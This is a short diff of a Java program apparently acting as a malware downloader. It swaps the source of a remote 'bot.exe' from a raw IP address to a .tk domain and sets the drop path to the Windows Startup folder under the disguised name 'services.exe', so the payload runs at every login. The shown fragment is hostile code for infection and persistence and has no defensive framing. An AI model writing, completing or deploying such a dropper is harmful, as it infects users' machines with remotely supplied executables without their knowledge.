@@ -6,7 +6,7 @@ import java.util.Base64;
 public class Main {
 	public static void main(String args[]) throws InterruptedException, IOException,IllegalArgumentException
 	{
-	     String link = "http://159.65.11.28/bot.exe";
+	     String link = "https://www.bolt2003.tk/bot.exe";
 	     File payload_file = new File("C:/Users/" + System.getProperty("user.name") + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/services.exe");
 	     
 	     
